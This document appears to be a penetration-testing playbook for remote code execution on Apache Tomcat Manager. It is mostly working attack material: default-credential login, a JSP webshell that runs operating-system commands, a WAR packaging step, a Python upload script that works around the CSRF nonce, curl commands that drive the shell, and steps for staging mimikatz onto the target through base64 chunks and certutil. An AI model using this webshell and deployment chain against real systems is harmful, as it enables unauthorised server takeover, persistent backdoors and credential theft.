# Tomcat WAR Deploy RCE (GUI-Only Manager)

## Trigger
- Tomcat Manager accessible with default/weak creds (tomcat:tomcat, admin:admin, tomcat:s3cret)
- User has `manager-gui` role but NOT `manager-script` (text interface returns 403)

## Technique

### 1. Verify Access
```bash
curl -sk -u tomcat:tomcat http://TARGET:8080/manager/html | grep "Manager App"
```

### 2. Create JSP Webshell WAR
```bash
# cmd.jsp
cat > cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) { out.println(line); }
}
%>
EOF
mkdir -p WEB-INF
echo '<?xml version="1.0"?><web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0"><display-name>cmd</display-name></web-app>' > WEB-INF/web.xml
jar -cf shell.war cmd.jsp WEB-INF/web.xml
```

### 3. Deploy via HTML Manager (Python - handles CSRF)
```python
import requests, re
s = requests.Session()
s.auth = ('tomcat', 'tomcat')
s.verify = False
r = s.get('http://TARGET:8080/manager/html')
nonce = re.search(r'CSRF_NONCE=([A-F0-9]+)', r.text).group(1)
url = f'http://TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={nonce}'
r2 = s.post(url, files={'deployWar': ('shell.war', open('shell.war','rb'), 'application/octet-stream')})
if '/shell' in r2.text:
    print('DEPLOYED')
```

### 4. Execute Commands
```bash
curl -sk "http://TARGET:8080/shell/cmd.jsp?cmd=whoami"
# For commands with spaces, use + or URL encode
curl -sk "http://TARGET:8080/shell/cmd.jsp?cmd=net+user+/domain"
# POST also works:
curl -sk -X POST "http://TARGET:8080/shell/cmd.jsp" -d "cmd=whoami"
```

## Key Notes
- CSRF nonce is SESSION-BOUND — must use same session for GET nonce + POST upload
- curl-based deploy (text interface) fails with 403 if user only has manager-gui role
- Tomcat 9.0.0.M9 runs webshell as the service account (often SYSTEM on Windows)
- For Linux targets, change cmd.exe to /bin/bash in the JSP

## Uploading Binaries via Webshell
When msfvenom/tools unavailable, upload mimikatz via:
1. Base64 encode binary locally
2. Write chunks to target using PowerShell `[IO.File]::WriteAllText` (first chunk) + `[IO.File]::AppendAllText` (subsequent) via POST
3. Decode with `certutil -decode input.txt output.exe`
4. Chunk size: 8000 chars for GET, 30000 for POST (safe limits)
